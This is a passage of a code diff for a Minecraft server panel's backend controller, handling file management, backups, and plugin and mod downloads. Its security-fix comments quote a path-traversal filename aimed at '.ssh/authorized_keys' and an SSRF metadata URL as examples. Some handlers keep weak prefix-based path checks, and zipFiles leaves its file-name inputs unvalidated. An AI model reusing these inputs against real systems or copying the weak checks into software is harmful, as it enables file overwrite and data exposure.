+    res.status(500).json({ error: err.message });
+  }
+};
+
+export const completeUpload = async (req: Request, res: Response) => {
+  if (!(await checkServerFileAccess(req, res))) return;
+  const { id } = req.params;
+  const { uploadId, fileName, path: dirPath, totalChunks } = req.body;
+  if (!uploadId || !fileName || !totalChunks) {
+    return res.status(400).json({ error: "Missing parameters" });
+  }
+
+  const targetPath = path.join(process.cwd(), ".data", "servers", id, dirPath || "/");
+  const finalFilePath = path.join(targetPath, fileName);
+  const partFilePath = path.join(targetPath, fileName + '.part');
+  
+  if (!finalFilePath.startsWith(path.join(process.cwd(), ".data", "servers", id))) {
+    return res.status(403).json({ error: "Invalid path" });
+  }
+
+  try {
+    if (fs.existsSync(partFilePath)) {
+      await fs.move(partFilePath, finalFilePath, { overwrite: true });
+    } else {
+      // In case totalChunks was 0 or something weird, but usually part file must exist.
+      throw new Error("Part file missing");
+    }
+    res.json({ success: true });
+  } catch (err: any) {
+    res.status(500).json({ error: err.message });
+  }
+};
+
+export const uploadFile = async (req: Request, res: Response) => {
+  if (!(await checkServerFileAccess(req, res))) return;
+  const { id } = req.params;
+  let dirPath = req.body.path || "/";
+  
+  // If dirPath matches or ends with the uploaded file name, normalize to parent directory
+  if (req.file) {
+    if (dirPath === req.file.originalname || dirPath === `/${req.file.originalname}` || dirPath === `\\${req.file.originalname}`) {
+      dirPath = "/";
+    } else if (dirPath.endsWith(req.file.originalname)) {
+      dirPath = path.dirname(dirPath);
+    }
+  }
+
+  const serverBase = path.join(process.cwd(), ".data", "servers", id);
+  const targetPath = path.join(serverBase, dirPath);
+  
+  if (!targetPath.startsWith(serverBase)) {
+    return res.status(403).json({ error: "Invalid path" });
+  }
+
+  if (req.file) {
+    // SECURITY FIX (was CRITICAL): originalname is raw client input from the
+    // multipart header and used to flow unsanitized into path.join — a name
+    // like "../../../../home/user/.ssh/authorized_keys" wrote ANYWHERE on disk.
+    await fs.ensureDir(targetPath);
+    const destFile = path.join(targetPath, path.basename(req.file.originalname));
+    const resolvedDest = path.resolve(destFile);
+    const resolvedBase = path.resolve(serverBase);
+    if (resolvedDest !== resolvedBase && !resolvedDest.startsWith(resolvedBase + path.sep)) {
+      return res.status(403).json({ error: "Invalid file name" });
+    }
+    await fs.move(req.file.path, destFile, { overwrite: true });
+  }
+  res.json({ success: true });
+};
+
+export const deleteFile = async (req: Request, res: Response) => {
+  if (!(await checkServerFileAccess(req, res))) return;
+  const { id } = req.params;
+  const filePaths = req.body.paths || (req.body.path ? [req.body.path] : []);
+  
+  try {
+    for (const filePath of filePaths) {
+      const targetPath = path.join(process.cwd(), ".data", "servers", id, filePath);
+      
+      if (!targetPath.startsWith(path.join(process.cwd(), ".data", "servers", id))) {
+        return res.status(403).json({ error: "Invalid path" });
+      }
+      
+      await fs.remove(targetPath);
+    }
+    res.json({ success: true });
+  } catch (e: any) {
+    res.status(500).json({ error: e.message });
+  }
+};
+
+export const zipFiles = async (req: Request, res: Response) => {
+  if (!(await checkServerFileAccess(req, res))) return;
+  const { id } = req.params;
+  const { dirPath, fileNames, outputName } = req.body;
+  
+  const baseDir = path.join(process.cwd(), ".data", "servers", id, dirPath);
+  const outZipPath = path.join(baseDir, outputName || "archive.zip");
+
+  if (!baseDir.startsWith(path.join(process.cwd(), ".data", "servers", id))) {
+    return res.status(403).json({ error: "Invalid path" });
+  }
+
+  try {
+    const output = fs.createWriteStream(outZipPath);
+    const archive = new ZipArchive({ zlib: { level: 9 } });
+
+    output.on("close", () => {
+      res.json({ success: true, filename: outputName || "archive.zip" });
+    });
+
+    archive.on("error", (err: any) => {
+      console.error("Archive error:", err);
+      if (!res.headersSent) res.status(500).json({ error: err.message });
+    });
+
+    archive.pipe(output);
+
+    for (const name of fileNames) {
+      const filePath = path.join(baseDir, name);
+      const stat = await fs.stat(filePath);
+      if (stat.isDirectory()) {
+        archive.directory(filePath, name);
+      } else {
+        archive.file(filePath, { name });
+      }
+    }
+
+    await archive.finalize();
+  } catch (e: any) {
+    if (!res.headersSent) res.status(500).json({ error: e.message });
+  }
+};
+
+export const renameFile = async (req: Request, res: Response) => {
+  if (!(await checkServerFileAccess(req, res))) return;
+  const { id } = req.params;
+  const { oldPath, newPath } = req.body;
+
+  const targetOldPath = path.join(process.cwd(), ".data", "servers", id, oldPath);
+  const targetNewPath = path.join(process.cwd(), ".data", "servers", id, newPath);
+
+  if (!targetOldPath.startsWith(path.join(process.cwd(), ".data", "servers", id)) ||
+      !targetNewPath.startsWith(path.join(process.cwd(), ".data", "servers", id))) {
+    return res.status(403).json({ error: "Invalid path" });
+  }
+
+  try {
+    await fs.rename(targetOldPath, targetNewPath);
+    res.json({ success: true });
+  } catch (e: any) {
+    res.status(500).json({ error: e.message });
+  }
+}
+
+export const downloadFile = async (req: Request, res: Response) => {
+  if (!(await checkServerFileAccess(req, res))) return;
+  const { id } = req.params;
+  let rawPaths: string[] = [];
+  if (req.query.paths) {
+    rawPaths = Array.isArray(req.query.paths) ? (req.query.paths as string[]) : String(req.query.paths).split(",");
+  } else if (req.query.path) {
+    rawPaths = [String(req.query.path)];
+  }
+
+  if (rawPaths.length === 0) {
+    return res.status(400).json({ error: "No path specified" });
+  }
+
+  const serverBaseDir = path.join(process.cwd(), ".data", "servers", id);
+
+  try {
+    if (rawPaths.length === 1) {
+      const singlePath = rawPaths[0];
+      const targetPath = path.join(serverBaseDir, singlePath);
+
+      if (!targetPath.startsWith(serverBaseDir)) {
+        return res.status(403).json({ error: "Invalid path" });
+      }
+
+      const stat = await fs.stat(targetPath);
+      if (!stat.isDirectory()) {
+        return res.download(targetPath, path.basename(targetPath));
+      }
+    }
+
+    // Multiple items OR a single directory -> stream as ZIP
+    const zipName = rawPaths.length === 1 
+      ? `${path.basename(rawPaths[0]) || "folder"}.zip`
+      : `download-${Date.now()}.zip`;
+
+    res.setHeader("Content-Type", "application/zip");
+    res.setHeader("Content-Disposition", `attachment; filename="${zipName}"`);
+
+    const archive = new ZipArchive({ zlib: { level: 9 } });
+    archive.on("error", (err: any) => {
+      if (!res.headersSent) res.status(500).json({ error: err.message });
+    });
+    archive.pipe(res);
+
+    for (const relPath of rawPaths) {
+      const targetPath = path.join(serverBaseDir, relPath);
+      if (!targetPath.startsWith(serverBaseDir)) continue;
+      const itemName = path.basename(targetPath);
+      const stat = await fs.stat(targetPath).catch(() => null);
+      if (!stat) continue;
+
+      if (stat.isDirectory()) {
+        archive.directory(targetPath, itemName);
+      } else {
+        archive.file(targetPath, { name: itemName });
+      }
+    }
+
+    await archive.finalize();
+  } catch (e: any) {
+    if (!res.headersSent) res.status(500).json({ error: e.message });
+  }
+};
+
+export const unzipFile = async (req: Request, res: Response) => {
+  if (!(await checkServerFileAccess(req, res))) return;
+  const { id } = req.params;
+  const { path: filePath } = req.body;
+
+  if (!filePath) {
+    return res.status(400).json({ error: "Archive file path is required" });
+  }
+
+  const serverBaseDir = path.join(process.cwd(), ".data", "servers", id);
+  let targetPath = path.join(serverBaseDir, filePath);
+  
+  if (!targetPath.startsWith(serverBaseDir)) {
+    return res.status(403).json({ error: "Invalid path: Access outside server directory is forbidden" });
+  }
+
+  if (!fs.existsSync(targetPath)) {
+    return res.status(404).json({ error: `File not found: ${filePath}` });
+  }
+
+  try {
+    const stat = await fs.stat(targetPath);
+    
+    // If targetPath is a directory (e.g. a folder named 'Stad 2_0.zip')
+    if (stat.isDirectory()) {
+      const baseName = path.basename(targetPath);
+      const nestedFilePath = path.join(targetPath, baseName);
+      
+      // Check if there is an actual archive file inside this folder with the same name
+      if (fs.existsSync(nestedFilePath) && (await fs.stat(nestedFilePath)).isFile()) {
+        targetPath = nestedFilePath;
+      } else {
+        // Look for any archive file inside this directory
+        const filesInside = await fs.readdir(targetPath);
+        const archiveInside = filesInside.find(f => /\.(zip|tar|gz|tgz|jar|rar|7z)$/i.test(f));
+        if (archiveInside) {
+          targetPath = path.join(targetPath, archiveInside);
+        } else {
+          return res.status(400).json({ error: `'${filePath}' is a folder directory, not an archive file.` });
+        }
+      }
+    }
+
+    const destDir = path.dirname(targetPath);
+    const result = await extractArchive(targetPath, destDir);
+    res.json({ success: true, method: result.method });
+  } catch (e: any) {
+    console.error("Extraction error:", e);
+    res.status(500).json({ error: e.message || "Failed to extract archive file" });
+  }
+};
+
+
+export const createFile = async (req: Request, res: Response) => {
+  if (!(await checkServerFileAccess(req, res))) return;
+  const { id } = req.params;
+  const { filePath } = req.body;
+  const targetPath = path.join(process.cwd(), ".data", "servers", id, filePath);
+  if (!targetPath.startsWith(path.join(process.cwd(), ".data", "servers", id))) {
+    return res.status(403).json({ error: "Invalid path" });
+  }
+  try {
+    await fs.writeFile(targetPath, "", "utf-8");
+    res.json({ success: true });
+  } catch (e: any) {
+    res.status(500).json({ error: e.message });
+  }
+};
+
+export const createDirectory = async (req: Request, res: Response) => {
+  if (!(await checkServerFileAccess(req, res))) return;
+  const { id } = req.params;
+  const { filePath } = req.body;
+  const targetPath = path.join(process.cwd(), ".data", "servers", id, filePath);
+  if (!targetPath.startsWith(path.join(process.cwd(), ".data", "servers", id))) {
+    return res.status(403).json({ error: "Invalid path" });
+  }
+  try {
+    await fs.mkdir(targetPath, { recursive: true });
+    res.json({ success: true });
+  } catch (e: any) {
+    res.status(500).json({ error: e.message });
+  }
+};
+
+export const saveFileContent = async (req: Request, res: Response) => {
+  if (!(await checkServerFileAccess(req, res))) return;
+  const { id } = req.params;
+  const { filePath, content } = req.body;
+
+  const targetPath = path.join(process.cwd(), ".data", "servers", id, filePath);
+
+  if (!targetPath.startsWith(path.join(process.cwd(), ".data", "servers", id))) {
+    return res.status(403).json({ error: "Invalid path" });
+  }
+
+  try {
+    await fs.writeFile(targetPath, content, "utf-8");
+
+    // If server.properties was saved, keep server.onlineMode state in sync
+    if (filePath === "server.properties" || filePath.endsWith("/server.properties")) {
+      const match = content.match(/^online-mode\s*=\s*(true|false)/im);
+      if (match) {
+        const isOnline = match[1].toLowerCase() === "true";
+        const servers = await readJSON("servers.json") || [];
+        const s = servers.find((serv: any) => serv.id === id);
+        if (s && s.onlineMode !== isOnline) {
+          s.onlineMode = isOnline;
+          await writeJSON("servers.json", servers);
+        }
+      }
+    }
+
+    res.json({ success: true });
+  } catch (e: any) {
+    res.status(500).json({ error: e.message });
+  }
+};
+
+export const getBackups = async (req: Request, res: Response) => {
+  if (!(await checkServerFileAccess(req, res))) return;
+  const { id } = req.params;
+  const backupsDir = path.join(process.cwd(), ".data", "backups", id);
+  await fs.ensureDir(backupsDir);
+
+  try {
+    const files = await fs.readdir(backupsDir);
+    const backups = [];
+    for (const file of files) {
+      if (file.endsWith(".zip")) {
+        const stats = await fs.stat(path.join(backupsDir, file));
+        backups.push({
+          filename: file,
+          size: stats.size,
+          createdAt: stats.birthtime,
+        });
+      }
+    }
+    backups.sort((a, b) => b.createdAt.getTime() - a.createdAt.getTime());
+    res.json(backups);
+  } catch (e: any) {
+    res.status(500).json({ error: e.message });
+  }
+};
+
+export const createBackup = async (req: Request, res: Response) => {
+  if (!(await checkServerFileAccess(req, res))) return;
+  const { id } = req.params;
+  const serverDir = path.join(process.cwd(), ".data", "servers", id);
+  const backupsDir = path.join(process.cwd(), ".data", "backups", id);
+  await fs.ensureDir(backupsDir);
+
+  const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
+  const filename = `backup-${timestamp}.zip`;
+  const backupPath = path.join(backupsDir, filename);
+
+  try {
+    const serverExists = await fs.pathExists(serverDir);
+    if (!serverExists) {
+       await fs.ensureDir(serverDir); // ensure it acts properly if empty
+    }
+
+    const output = fs.createWriteStream(backupPath);
+    const archive = new ZipArchive({ zlib: { level: 9 } });
+
+    output.on("close", () => {
+      if (!res.headersSent) res.json({ success: true, filename });
+    });
+
+    archive.on("error", (err: any) => {
+      console.error("Archive error:", err);
+      if (!res.headersSent) res.status(500).json({ error: err.message });
+    });
+
+    archive.pipe(output);
+    archive.directory(serverDir, false);
+    await archive.finalize();
+  } catch (e: any) {
+    if (!res.headersSent) res.status(500).json({ error: e.message });
+  }
+};
+
+export const downloadBackup = async (req: Request, res: Response) => {
+  if (!(await checkServerFileAccess(req, res))) return;
+  const { id, filename } = req.params;
+  const safeFilename = path.basename(filename);
+  const backupPath = path.join(process.cwd(), ".data", "backups", id, safeFilename);
+
+  // basic path traversal prevention
+  if (!backupPath.startsWith(path.join(process.cwd(), ".data", "backups", id))) {
+    return res.status(403).json({ error: "Invalid path" });
+  }
+
+  try {
+    const exists = await fs.pathExists(backupPath);
+    if (!exists) {
+      return res.status(404).json({ error: "Backup not found" });
+    }
+
+    const stat = await fs.stat(backupPath);
+    res.setHeader("Content-Type", "application/zip");
+    res.setHeader("Content-Disposition", `attachment; filename="${encodeURIComponent(safeFilename)}"`);
+    res.setHeader("Content-Length", stat.size);
+
+    const stream = fs.createReadStream(backupPath);
+    stream.on("error", (err: any) => {
+      console.error("Backup stream error:", err);
+      if (!res.headersSent) {
+        res.status(500).json({ error: "Failed to read backup file." });
+      }
+    });
+    return stream.pipe(res);
+  } catch (err: any) {
+    console.error("Download backup error:", err);
+    if (!res.headersSent) {
+      res.status(500).json({ error: err.message || "Failed to download backup" });
+    }
+  }
+};
+
+export const deleteBackup = async (req: Request, res: Response) => {
+  if (!(await checkServerFileAccess(req, res))) return;
+  const { id, filename } = req.params;
+  const backupPath = path.join(process.cwd(), ".data", "backups", id, filename);
+
+  if (!backupPath.startsWith(path.join(process.cwd(), ".data", "backups", id))) {
+    return res.status(403).json({ error: "Invalid path" });
+  }
+
+  try {
+    await fs.remove(backupPath);
+    res.json({ success: true });
+  } catch (e: any) {
+    res.status(500).json({ error: e.message });
+  }
+};
+// Helper to safely download a file without leaving corrupt or partial files on error
+const downloadFileSafely = async (downloadUrl: string, targetDir: string, filename: string): Promise<string> => {
+  // SECURITY FIX (SSRF): the panel used to fetch ANY url a user supplied
+  // (e.g. http://169.254.169.254/... or internal services). Downloads are now
+  // restricted to well-known Minecraft mod/plugin distribution hosts.
+  const ALLOWED_DOWNLOAD_HOSTS = new Set([
+    "api.modrinth.com", "cdn.modrinth.com",
+    "api.spiget.org", "static.spiget.org",
+    "api.hangar.papermc.io", "hangarcdn.papermc.io",
+    "api.curseforge.com", "edge.forgecdn.net", "mediafilez.forgecdn.net",
+    "github.com", "objects.githubusercontent.com", "raw.githubusercontent.com", "codeload.github.com",
+    "api.papermc.io", "download.getbukkit.org", "cdn.getbukkit.org",
+    "purpurmc.org", "api.purpurmc.org", "api.purpur.org",
+    "maven.fabricmc.net", "meta.fabricmc.net", "piston-data.mojang.com", "piston-meta.mojang.com", "launcher.mojang.com",
+    "neoforge.org", "maven.neoforged.net",
+    "cdn.jsdelivr.net", "unpkg.com"
+  ]);
+  let parsedUrl: URL;
+  try {
+    parsedUrl = new URL(downloadUrl);
+  } catch (e) {
+    throw new Error("Invalid download URL");
+  }
+  if (!(["http:", "https:"] as any).includes(parsedUrl.protocol)) {
+    throw new Error("Only http(s) download URLs are allowed");
+  }
+  if (!ALLOWED_DOWNLOAD_HOSTS.has(parsedUrl.hostname)) {
+    throw new Error(`Downloads from host "${parsedUrl.hostname}" are not allowed. Allowed: Modrinth, Hangar, Spiget, CurseForge, GitHub, PaperMC, Purpur, Fabric, Mojang, NeoForge.`);
+  }
+
+  const axios = (await import("axios")).default;
+  await fs.ensureDir(targetDir);
+
+  // Sanitize filename and ensure .jar extension
+  let safeFilename = path.basename(filename).replace(/[^a-zA-Z0-9._-]/g, "_");
+  if (!safeFilename.toLowerCase().endsWith(".jar")) {
+    safeFilename += ".jar";
+  }
+
+  const finalFilePath = path.join(targetDir, safeFilename);
+  const tempFilePath = path.join(targetDir, `${safeFilename}.${Date.now()}.download.tmp`);
+
+  try {
+    const response = await axios({
+      url: downloadUrl,
+      method: "GET",
+      responseType: "stream",
+      timeout: 60000,
+      headers: {
+        "User-Agent": "PROTO-Panel/1.0 (Minecraft Server Manager)"
+      }
+    });
+
+    const writer = fs.createWriteStream(tempFilePath);
+    response.data.pipe(writer);
+
+    await new Promise<void>((resolve, reject) => {
+      writer.on("finish", resolve);
+      writer.on("error", reject);
+    });
+
+    const stat = await fs.stat(tempFilePath).catch(() => null);
+    if (!stat || stat.size === 0) {
+      await fs.remove(tempFilePath).catch(() => {});
+      throw new Error("Downloaded file was empty or incomplete.");
+    }
+
+    await fs.move(tempFilePath, finalFilePath, { overwrite: true });
+    return safeFilename;
+  } catch (err: any) {
+    await fs.remove(tempFilePath).catch(() => {});
+    throw err;
+  }
+};
+
+// Helper to resolve best Modrinth version and file matching server type and version
+const resolveModrinthVersionAndFile = async (
+  projectId: string,
+  serverType: string,
+  serverVersion: string,
+  specificVersionId?: string,
+  specificFileUrl?: string,
+  specificFileName?: string
+) => {
+  const axios = (await import("axios")).default;
+
+  // 1. If exact file URL and filename were specified by the user
+  if (specificFileUrl && specificFileName) {
+    return {
+      downloadUrl: specificFileUrl,
+      filename: specificFileName,
+      versionNumber: "Selected Release File"
+    };
+  }
+
+  // 2. If a specific version was chosen by the user
+  if (specificVersionId) {
+    const vRes = await axios.get(`https://api.modrinth.com/v2/version/${specificVersionId}`, {
+      headers: { "User-Agent": "PROTO-Panel/1.0" }
+    });
+    if (vRes.data && vRes.data.files && vRes.data.files.length > 0) {
+      const file = vRes.data.files.find((f: any) => f.primary) ||
+                   vRes.data.files.find((f: any) => f.filename.endsWith(".jar")) ||
+                   vRes.data.files[0];
+      return {
+        downloadUrl: file.url,
+        filename: file.filename,
+        versionNumber: vRes.data.version_number || vRes.data.name
+      };
+    }
+  }
+
+  // 3. Auto-detect based on server type & version
+  const isMod = ["FABRIC", "FORGE", "NEOFORGE", "QUILT"].includes(serverType.toUpperCase());
+  const loaders = isMod
+    ? (serverType.toUpperCase() === "QUILT" ? ["quilt", "fabric"] : [serverType.toLowerCase()])
+    : ["paper", "spigot", "purpur", "bukkit", "folia"];
+
+  let gameVer = String(serverVersion || "1.21.4").trim();
+  if (gameVer.startsWith("26") || gameVer.toLowerCase() === "latest") {
+    gameVer = "1.21.4";
+  }
+
+  const verRes = await axios.get(`https://api.modrinth.com/v2/project/${projectId}/version`, {
+    headers: { "User-Agent": "PROTO-Panel/1.0" }
+  });
+
+  const versions = verRes.data;
+  if (!versions || versions.length === 0) {
+    return null;
+  }
+
+  // A. Try exact loader + exact game version
+  let match = versions.find((v: any) =>
+    Array.isArray(v.loaders) &&
+    v.loaders.some((l: string) => loaders.includes(l.toLowerCase())) &&
+    Array.isArray(v.game_versions) &&
+    v.game_versions.includes(gameVer)
+  );
+
+  // B. Try exact loader + minor version prefix (e.g. "1.21")
+  if (!match) {
+    const minorVer = gameVer.split(".").slice(0, 2).join(".");
+    match = versions.find((v: any) =>
+      Array.isArray(v.loaders) &&
+      v.loaders.some((l: string) => loaders.includes(l.toLowerCase())) &&
+      Array.isArray(v.game_versions) &&
+      v.game_versions.some((gv: string) => gv.startsWith(minorVer))
+    );
+  }
+
+  // C. Try exact loader (latest release for that loader)
+  if (!match) {
+    match = versions.find((v: any) =>
+      Array.isArray(v.loaders) &&
+      v.loaders.some((l: string) => loaders.includes(l.toLowerCase()))
+    );
+  }
+
+  // D. Fallback to newest version available
+  if (!match) {
+    match = versions[0];
+  }
+
+  if (!match || !match.files || match.files.length === 0) return null;
+
+  const file = match.files.find((f: any) => f.primary) ||
+               match.files.find((f: any) => f.filename.endsWith(".jar") && !f.filename.includes("-sources") && !f.filename.includes("-dev")) ||
+               match.files.find((f: any) => f.filename.endsWith(".jar")) ||
+               match.files[0];
+
+  return {
+    downloadUrl: file.url,
+    filename: file.filename,
+    versionNumber: match.version_number || match.name
+  };
+};
+
+export const installPlugin = async (req: Request, res: Response) => {
+  const { id } = req.params;
+  const user = (req as any).user;
+  const serversJSON = await readJSON("servers.json");
+  const server = serversJSON?.find((s: any) => s.id === id);
+  if (!server) return res.status(404).json({ error: "Server not found" });
+  if (user && user.role !== "admin" && user.role !== "owner" && server.owner !== user.id) {
+    return res.status(403).json({ error: "Forbidden" });
+  }
+
+  const serverType = (server.type || "").toUpperCase();
+
+  // Explicitly check for Proxy software and reject
+  const isProxy = ["VELOCITY", "BUNGEECORD", "WATERFALL"].includes(serverType);
+  if (isProxy) {
+    return res.status(400).json({
+      error: "Plugin Manager is disabled for proxy servers (Velocity, BungeeCord, Waterfall). Proxy plugins must be placed manually via File Manager."
+    });
+  }
+
+  const pluginCompatibleTypes = ["PAPER", "SPIGOT", "BUKKIT", "PURPUR"];
+  if (!pluginCompatibleTypes.includes(serverType)) {
+    return res.status(400).json({
+      error: `Cannot install Bukkit/Spigot plugins on a ${server.type} server. This software does not support Bukkit plugins.`
+    });
+  }
+
+  const { source, pluginId, pluginName, versionId, fileUrl, fileName } = req.body;
+
+  // Direct downloadUrl fallback for manual/legacy downloads
+  if (req.body.downloadUrl) {
+    try {
+      const serverDir = path.join(process.cwd(), ".data", "servers", id);
+      const pluginsDir = path.join(serverDir, "plugins");
+      const installedName = await downloadFileSafely(req.body.downloadUrl, pluginsDir, req.body.filename || `${pluginName}.jar`);
+      return res.json({ success: true, message: `Plugin ${installedName} installed successfully!`, filename: installedName });
+    } catch (e: any) {
+      return res.status(500).json({ error: "Failed to install plugin: " + e.message });
+    }
+  }
+
+  if (!pluginId) {
+    return res.status(400).json({ error: "Missing pluginId" });
+  }
+
+  try {
+    const serverDir = path.join(process.cwd(), ".data", "servers", id);
+    const pluginsDir = path.join(serverDir, "plugins");
+    let downloadUrl: string | null = null;
+    let filename: string = fileName || `${(pluginName || pluginId).replace(/[^a-zA-Z0-9]/g, '_')}.jar`;
+    let installedVersion = "";
+
+    const currentSource = source || 'modrinth';
+
+    if (currentSource === 'modrinth') {
+      const resolved = await resolveModrinthVersionAndFile(
+        pluginId,
+        server.type,
+        server.version,
+        versionId,
+        fileUrl,
+        fileName
+      );
+
+      if (!resolved || !resolved.downloadUrl) {
+        return res.status(404).json({ error: "Could not find a compatible plugin version on Modrinth for your server." });
+      }
+
+      downloadUrl = resolved.downloadUrl;
+      filename = resolved.filename;
+      installedVersion = resolved.versionNumber;
+    } else if (currentSource === 'spigot') {
+      const axios = (await import("axios")).default;
+      const apiRes = await axios.get(`https://api.spiget.org/v2/resources/${pluginId}`);
+      if (apiRes.data && apiRes.data.file) {
+        downloadUrl = `https://api.spiget.org/v2/resources/${pluginId}/download`;
+      }
+    }
+
+    if (!downloadUrl) {
+      return res.status(404).json({ error: "Could not find a valid download URL for this plugin." });
+    }
+
+    const installedFile = await downloadFileSafely(downloadUrl, pluginsDir, filename);
+
+    res.json({
+      success: true,
+      message: `${pluginName || installedFile} (Version: ${installedVersion || 'Latest'}) installed successfully into plugins/! Restart your server to load it.`,
+      filename: installedFile,
+      version: installedVersion
+    });
+  } catch (error: any) {
+    console.error("Plugin installation failed:", error.message);
+    res.status(500).json({ error: "Plugin installation failed: " + error.message });
+  }
+};
+
+export const getInstalledPlugins = async (req: Request, res: Response) => {
+  if (!(await checkServerFileAccess(req, res))) return;
+  const { id } = req.params;
+  const pluginsDir = path.join(process.cwd(), ".data", "servers", id, "plugins");
+
+  try {
+    await fs.ensureDir(pluginsDir);
+    const entries = await fs.readdir(pluginsDir, { withFileTypes: true });
+    const plugins = [];
+
+    for (const entry of entries) {
+      if (entry.isFile() && entry.name.toLowerCase().endsWith(".jar")) {
+        const stat = await fs.stat(path.join(pluginsDir, entry.name)).catch(() => null);
+        plugins.push({
+          filename: entry.name,
+          size: stat?.size || 0,
+          modified: stat?.mtimeMs || 0
+        });
+      }
+    }
+
+    plugins.sort((a, b) => b.modified - a.modified);
+    res.json({ plugins });
+  } catch (err: any) {
+    res.status(500).json({ error: err.message });
+  }
+};
+
+export const deleteInstalledPlugin = async (req: Request, res: Response) => {
+  if (!(await checkServerFileAccess(req, res))) return;
+  const { id, filename } = req.params;
+  const safeFilename = path.basename(filename);
+  const filePath = path.join(process.cwd(), ".data", "servers", id, "plugins", safeFilename);
+
+  try {
+    if (await fs.pathExists(filePath)) {
+      await fs.remove(filePath);
+      return res.json({ success: true, message: `Uninstalled ${safeFilename}` });
+    }
+    res.status(404).json({ error: "Plugin file not found" });
+  } catch (err: any) {
+    res.status(500).json({ error: err.message });
+  }
+};
+
+export const installMod = async (req: Request, res: Response) => {
+  const { id } = req.params;
+  const user = (req as any).user;
+  const serversJSON = await readJSON("servers.json");
+  const server = serversJSON?.find((s: any) => s.id === id);
+  if (!server) return res.status(404).json({ error: "Server not found" });
+  if (user && user.role !== "admin" && user.role !== "owner" && server.owner !== user.id) {
+    return res.status(403).json({ error: "Forbidden" });
+  }
+
+  const serverType = (server.type || "").toUpperCase();
+
+  // Explicitly check for Proxy software and reject
+  const isProxy = ["VELOCITY", "BUNGEECORD", "WATERFALL"].includes(serverType);
+  if (isProxy) {
+    return res.status(400).json({
+      error: "Mod Manager is disabled for proxy servers (Velocity, BungeeCord, Waterfall)."
+    });
+  }
+
+  const modCompatibleTypes = ["FABRIC", "FORGE", "NEOFORGE", "QUILT"];
+  if (!modCompatibleTypes.includes(serverType)) {
+    return res.status(400).json({
+      error: `Cannot install Fabric/Forge mods on a ${server.type} server. This software does not support mods.`
+    });
+  }
+
+  const { pluginId, pluginName, versionId, fileUrl, fileName } = req.body;
+
+  if (!pluginId) {
+    return res.status(400).json({ error: "Missing pluginId (mod ID)" });
+  }
+
+  try {
+    const serverDir = path.join(process.cwd(), ".data", "servers", id);
+    const modsDir = path.join(serverDir, "mods");
+
+    const resolved = await resolveModrinthVersionAndFile(
+      pluginId,
+      server.type,
+      server.version,
+      versionId,
+      fileUrl,
+      fileName
+    );
+
+    if (!resolved || !resolved.downloadUrl) {
+      return res.status(404).json({ error: "Could not find a compatible mod version on Modrinth for your server." });
+    }
+
+    const filename = resolved.filename || `${(pluginName || pluginId).replace(/[^a-zA-Z0-9]/g, '_')}.jar`;
+    const installedFile = await downloadFileSafely(resolved.downloadUrl, modsDir, filename);
+
+    res.json({
+      success: true,
+      message: `${pluginName || installedFile} (Version: ${resolved.versionNumber || 'Latest'}) installed successfully into mods/! Restart your server to load it.`,
+      filename: installedFile,
+      version: resolved.versionNumber
+    });
+  } catch (error: any) {
+    console.error("Mod installation failed:", error.message);
+    res.status(500).json({ error: "Mod installation failed: " + error.message });
+  }
+};
+
+export const getInstalledMods = async (req: Request, res: Response) => {
+  if (!(await checkServerFileAccess(req, res))) return;
+  const { id } = req.params;
+  const modsDir = path.join(process.cwd(), ".data", "servers", id, "mods");
+
+  try {
+    await fs.ensureDir(modsDir);
+    const entries = await fs.readdir(modsDir, { withFileTypes: true });
+    const mods = [];
+
+    for (const entry of entries) {
+      if (entry.isFile() && entry.name.toLowerCase().endsWith(".jar")) {
+        const stat = await fs.stat(path.join(modsDir, entry.name)).catch(() => null);
+        mods.push({
+          filename: entry.name,
+          size: stat?.size || 0,
+          modified: stat?.mtimeMs || 0
+        });
+      }
+    }
+
+    mods.sort((a, b) => b.modified - a.modified);
+    res.json({ mods });
+  } catch (err: any) {
+    res.status(500).json({ error: err.message });
+  }
+};
+
+export const deleteInstalledMod = async (req: Request, res: Response) => {
+  if (!(await checkServerFileAccess(req, res))) return;
+  const { id, filename } = req.params;
+  const safeFilename = path.basename(filename);
+  const filePath = path.join(process.cwd(), ".data", "servers", id, "mods", safeFilename);
+
+  try {
+    if (await fs.pathExists(filePath)) {
+      await fs.remove(filePath);
+      return res.json({ success: true, message: `Uninstalled ${safeFilename}` });
+    }
+    res.status(404).json({ error: "Mod file not found" });
+  } catch (err: any) {
+    res.status(500).json({ error: err.message });
+  }
+};
+
+export const getModrinthProjectVersions = async (req: Request, res: Response) => {
+  if (!(await checkServerFileAccess(req, res))) return;
+  const { projectId } = req.params;
+  const axios = (await import("axios")).default;
+
+  try {
+    const resp = await axios.get(`https://api.modrinth.com/v2/project/${projectId}/version`, {
+      headers: { "User-Agent": "PROTO-Panel/1.0" },
+      timeout: 15000
+    });
+    res.json(resp.data);
+  } catch (err: any) {
+    res.status(err.response?.status || 500).json({ error: err.message || "Failed to fetch Modrinth versions" });
+  }
+};
+
+export const updateResources = async (req: Request, res: Response) => {
+  try {
+    const { id } = req.params;
+    const { ram, cpu, disk } = req.body;
+    const servers = await readJSON("servers.json") || [];
+    const server = servers.find((s: any) => s.id === id);
+    if (!server) return res.status(404).json({ error: "Server not found" });
+    if ((req as any).user.role !== "admin" && (req as any).user.role !== "owner") return res.status(403).json({ error: "Unauthorized" });
+
+    server.ram = Number(ram);
+    server.cpu = Number(cpu);
+    server.disk = Number(disk);
+    await writeJSON("servers.json", servers);
+
+    // Stop container if running
+    if (server.containerId) {
+       try {
+         await stopServerRuntime(server);
+       } catch(e) {}
+    }
+
+    res.json(server);
+  } catch (error) {
+    res.status(500).json({ error: "Failed to update resources" });
+  }
+};
+
+export const updateSuspend = async (req: Request, res: Response) => {
+  try {
+    const { id } = req.params;
+    const { suspendDuration } = req.body; // permanent, 1_month, 2_months, 24_hours, 1_week, or null
+    const servers = await readJSON("servers.json") || [];
+    const server = servers.find((s: any) => s.id === id);
+    if (!server) return res.status(404).json({ error: "Server not found" });
+    if ((req as any).user.role !== "admin" && (req as any).user.role !== "owner") return res.status(403).json({ error: "Unauthorized" });
+
+    server.suspended = suspendDuration !== null;
+    server.suspendDuration = suspendDuration;
+    await writeJSON("servers.json", servers);
+
+    if (server.suspended && server.containerId) {
+       try {
+         await stopServerRuntime(server);
+       } catch(e) {}
+    }
+
+    res.json(server);
+  } catch (error) {
+    res.status(500).json({ error: "Failed to suspend server" });
+  }
+};
+
+
+
+
+
+
+export const updateRuntime = async (req: Request, res: Response) => {
+  try {
+    const { id } = req.params;
+    const { version, type, javaVersion, dockerImage, serverJar, startupCommand } = req.body;
+    const user = (req as any).user;
+
